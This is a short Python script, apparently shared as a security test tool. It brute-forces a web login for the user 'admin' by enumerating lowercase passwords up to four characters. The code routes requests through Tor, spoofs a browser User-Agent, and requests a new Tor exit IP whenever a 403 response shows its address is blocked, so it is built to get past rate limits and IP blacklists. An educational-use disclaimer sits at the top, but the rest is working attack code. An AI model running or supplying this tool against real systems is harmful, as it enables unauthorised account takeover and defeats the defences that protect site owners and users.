"""
DISCLAIMER

This script is intended **strictly for educational purposes** and to be used **only in controlled environments** 
that you own or have explicit permission to test.

Its purpose is to simulate brute-force attempts as part of a defensive security project 
(e.g., testing rate-limiting, IP blacklisting, or detection mechanisms on AWS).

Unauthorized use of this script against third-party systems is strictly prohibited. 
The author assumes **no responsibility** for any misuse or damages caused by illegal or unethical use.

Use responsibly and always follow applicable laws and ethical guidelines.
"""
import requests
import string
from itertools import product
import time
from stem import Signal
from stem.control import Controller


TOR_SOCKS_PORT = 9050
TOR_CONTROL_PORT = 9051

def renew_tor_ip():
    
    with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        time.sleep(5)  

def get_tor_session():
    
    session = requests.Session()
    session.proxies = {
        "http":  f"socks5h://127.0.0.1:{TOR_SOCKS_PORT}",
        "https": f"socks5h://127.0.0.1:{TOR_SOCKS_PORT}",
    }
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    })
    return session

def generate_passwords(max_length=4):
    
    letters = string.ascii_lowercase
    for length in range(1, max_length + 1):
        for pwd_tuple in product(letters, repeat=length):
            yield "".join(pwd_tuple)

def main():
    URL = "" #use /login
    username = "admin"

    session = get_tor_session()

    for password in generate_passwords():
        data = {"username": username, "password": password}

        try:
            resp = session.post(URL, data=data, timeout=10)

            if resp.status_code == 200:
                print(f"[92m[SUCCESS] Username: {username}, Password: {password}[0m")
                break

            elif resp.status_code == 403:
                
                if "username" in resp.text.lower():
                    print(f"[91m[BLOCKED] Username '{username}' is blacklisted. Aborting.[0m")
                    break
                else:
                    print(f"[91m[BLOCKED] Current IP is blocked. Changing IP...[0m")
                    renew_tor_ip()
                    session = get_tor_session()

            else:
                print(f"[FAIL] {username}:{password} -> Status {resp.status_code}")

        except Exception as e:
            print(f"[ERROR] Connection failed: {e}. Changing IP and retrying...")
            renew_tor_ip()
            session = get_tor_session()

if __name__ == "__main__":
    main()
